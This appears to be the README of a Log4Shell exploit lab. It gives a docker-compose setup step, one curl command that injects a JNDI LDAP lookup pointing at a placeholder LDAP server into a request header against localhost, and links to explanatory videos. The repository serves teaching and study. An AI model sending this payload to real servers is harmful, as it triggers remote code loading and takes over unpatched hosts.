# log4shell exploit lab

This repository is a single-line setup for log4shell exploit lab.

Setup the lab: `docker-compose up -d`

Run exploit: `curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`

Then go to `vul` container and see that indeed we pwned the machine:

![](README-resources/Screenshot%202023-11-30%20205423.png)

You can watch me explain how the exploit works, and the lab setup:

![Video explaining the lab setup](https://www.youtube.com/watch?v=WBzR30JcT5g)

And you can also watch me explain the code:

![Video explaining the code](https://www.youtube.com/watch?v=oRvp0c-fa1o)

